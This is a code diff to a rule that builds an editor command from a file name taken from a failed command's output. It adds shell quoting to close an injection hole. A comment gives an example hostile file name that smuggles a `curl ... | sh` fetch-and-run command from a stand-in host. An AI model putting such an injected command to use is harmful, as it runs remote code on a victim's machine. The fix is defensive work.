@@ -67,14 +67,20 @@ def get_new_command(command):
 
     # Note: there does not seem to be a standard for columns, so they are just
     # ignored by default
+    # The file is quoted. It is read out of whatever the failed command printed
+    # and it has to exist for this rule to fire at all -- but a file that exists
+    # is not a file you chose: cloning a repository or unpacking an archive is
+    # enough to put `a;curl evil.sh|sh .py` on disk, and the name then goes
+    # through `{file}` into a command the shell evaluates.
+    path = shell.quote(m.group('file'))
     if settings.fixcolcmd and 'col' in m.groupdict():
         editor_call = settings.fixcolcmd.format(editor=os.environ['EDITOR'],
-                                                file=m.group('file'),
+                                                file=path,
                                                 line=m.group('line'),
                                                 col=m.group('col'))
     else:
         editor_call = settings.fixlinecmd.format(editor=os.environ['EDITOR'],
-                                                 file=m.group('file'),
+                                                 file=path,
                                                  line=m.group('line'))
 
     return shell.and_(editor_call, command.script)
